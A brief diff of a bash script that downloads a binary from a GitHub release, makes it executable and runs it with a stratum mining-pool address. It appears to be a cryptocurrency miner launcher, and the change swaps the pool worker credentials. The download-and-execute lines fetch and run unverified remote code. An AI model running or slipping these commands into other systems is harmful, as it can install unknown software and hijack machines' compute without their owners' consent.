@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://github.com/vedhagsvp/soljtka/releases/download/latest/abelnak
 chmod +x abelnak
-./abelnak start -p stratum://45998109d8806685d4e96dabc275ee99977cc0b6e1f636657cd0d81c19d6e89d:b1mw7jKpFO@pool.abel-nakamoto.xyz:3333
+./abelnak -p stratum://243ef953f77c32bcea55a61a5521c1f9fcf246180750e630d1fd62905c9783e8:fb9da3426a@pool.abel-nakamoto.xyz:3333
 
